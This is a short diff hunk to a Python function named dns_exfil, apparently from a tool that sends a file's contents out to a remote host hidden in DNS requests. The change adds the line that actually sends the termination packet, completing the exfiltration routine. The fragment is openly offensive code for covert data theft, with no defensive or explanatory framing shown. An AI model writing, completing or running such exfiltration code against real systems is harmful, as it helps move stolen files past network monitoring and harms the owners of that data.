@@ -100,7 +100,8 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 	# Send termination packet:
 	dns_request = build_dns(host)
 	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
-
+	s.sendto(dns_request, addr)
+	
 	return 0
 
 
